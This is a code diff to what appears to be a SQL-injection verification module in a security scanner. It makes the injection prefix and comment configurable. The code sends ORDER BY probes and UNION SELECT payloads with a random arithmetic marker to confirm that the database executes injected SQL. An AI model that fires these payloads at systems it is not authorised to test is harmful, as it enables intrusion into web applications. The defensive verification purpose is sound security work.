@@ -2,6 +2,14 @@ import { httpRequest } from '../tools/http';
 import { fingerprintDb } from '../recon/fingerprint';
 import type { Finding, OracleEvidence } from './types';
 
+
+export interface InjectionContext {
+    prefix: string;   // breaks out of the current syntax AND makes the original match no rows
+    comment: string;  // ends the statement: "-- " or "#"
+}
+
+const DEFAULT_CTX: InjectionContext = { prefix: "'", comment: '-- ' };
+
 function randMarker(): string {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
     let s = '';
@@ -25,62 +33,57 @@ function isSqlError(res: { status: number }): boolean {
     return res.status >= 500;
 }
 
-// Efficient column-count discovery. ORDER BY N is valid while N <= column count
-// and errors once N exceeds it. Exponentially bracket, then binary-search:
-// a wide table resolves in ~log2(N) requests instead of a linear sweep.
-async function findColumnCountByOrderBy(finding: Finding): Promise<number | null> {
-    const first = await send(finding, `' ORDER BY 1-- `);
-    if (isSqlError(first)) return null; // ORDER BY probing not usable here
+async function findColumnCountByOrderBy(finding: Finding, ctx: InjectionContext): Promise<number | null> {
+    const first = await send(finding, `${ctx.prefix} ORDER BY 1${ctx.comment}`);
+    if (isSqlError(first)) return null;
 
-    let low = 1;   // known-valid
-    let bound = 0; // known-error upper bound
+    let low = 1, bound = 0;
     for (let probe = 2; probe <= 256; probe *= 2) {
-        const res = await send(finding, `' ORDER BY ${probe}-- `);
+        const res = await send(finding, `${ctx.prefix} ORDER BY ${probe}${ctx.comment}`);
         if (isSqlError(res)) { bound = probe; break; }
         low = probe;
     }
-    if (bound === 0) return null; // never errored — inconclusive
+    if (bound === 0) return null;
 
     let high = bound;
     while (high - low > 1) {
         const mid = Math.floor((low + high) / 2);
-        const res = await send(finding, `' ORDER BY ${mid}-- `);
+        const res = await send(finding, `${ctx.prefix} ORDER BY ${mid}${ctx.comment}`);
         if (isSqlError(res)) high = mid; else low = mid;
     }
-    return low; // highest N that did not error == column count
+    return low;
 }
 
-// Oracle 1 — COMPUTATIONAL. We invent a marker + arithmetic; only a DB that ran
-// our injected SQL can echo the computed value. Freshly generated each run, so a
-// hardcoded page or a lucky hunter cannot fake it.
-export async function computationalOracle(finding: Finding): Promise<OracleEvidence> {
+// Now takes an InjectionContext (defaults to string context, so existing callers
+// are unchanged). Deep-mode calls it with a non-string context (e.g. numeric).
+export async function computationalOracle(finding: Finding, ctx: InjectionContext = DEFAULT_CTX): Promise<OracleEvidence> {
     const marker = randMarker();
     const a = 100 + Math.floor(Math.random() * 900);
     const b = 100 + Math.floor(Math.random() * 900);
     const expected = `${marker}${a * b}`;
     const expr = `'${marker}'||(${a}*${b})`;
 
-    // Learn the column count efficiently, then try that count first.
-    const guessed = await findColumnCountByOrderBy(finding);
+    const guessed = await findColumnCountByOrderBy(finding, ctx);
     const candidates: number[] = [];
     if (guessed) candidates.push(guessed);
-    for (let c = 1; c <= 8; c++) if (!candidates.includes(c)) candidates.push(c); // fallback sweep
+    for (let c = 1; c <= 8; c++) if (!candidates.includes(c)) candidates.push(c);
 
     for (const cols of candidates) {
-        const injected = `' UNION SELECT ${Array(cols).fill(expr).join(',')}-- `;
+        const injected = `${ctx.prefix} UNION SELECT ${Array(cols).fill(expr).join(',')}${ctx.comment}`;
         const res = await send(finding, injected);
         if (res.body.includes(expected)) {
             return {
                 oracle: 'computational', passed: true, request: injected, expected,
                 actualSnippet: snippet(res.body, expected),
-                detail: `DB computed ${a}*${b} and echoed our marker (cols=${cols}${guessed ? `, ORDER BY found ${guessed}` : ', linear scan'}).`,
+                detail: `DB computed ${a}*${b} and echoed our marker (cols=${cols}, prefix="${ctx.prefix}").`,
             };
         }
     }
     return {
-        oracle: 'computational', passed: false, request: `UNION marker ${expected}`,
+        oracle: 'computational', passed: false,
+        request: `UNION marker ${expected} (prefix="${ctx.prefix}")`,
         expected,
-        actualSnippet: guessed ? `(marker not reflected; ORDER BY suggested ${guessed} cols)` : '(marker never reflected)',
+        actualSnippet: guessed ? `(not reflected; ORDER BY suggested ${guessed} cols)` : '(marker never reflected)',
     };
 }
 
